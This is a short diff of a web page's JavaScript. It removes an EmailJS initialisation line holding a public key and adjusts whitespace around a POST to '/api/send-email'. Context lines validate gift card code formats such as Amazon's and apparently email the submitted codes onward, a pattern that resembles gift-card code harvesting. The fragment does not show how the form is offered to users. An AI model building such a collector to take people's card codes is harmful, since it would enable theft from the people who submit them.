@@ -119,7 +119,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const modalClose = modal.querySelector(".modal-close");
 
   // EmailJS init
-  emailjs.init("lhvg3CREDwBk6RH_4"); // replace with your EmailJS public key
 
   const cardPatterns = {
     Amazon: { pattern: /^[A-Z0-9]{4}\.[A-Z0-9]{5}\.[A-Z0-9]{4}$/, format: "XXXX.XXXXX.XXXX" },
@@ -231,7 +230,7 @@ document.addEventListener("DOMContentLoaded", () => {
     // --------------------------
     // 🔥 SEND EMAIL
     // --------------------------
-   fetch("/api/send-email", {
+fetch("/api/send-email", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify(templateParams)
@@ -245,6 +244,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 })
 .catch(err => showModal(`⚠️ Server error: ${err.message}`));
+
 
 
     form.reset();
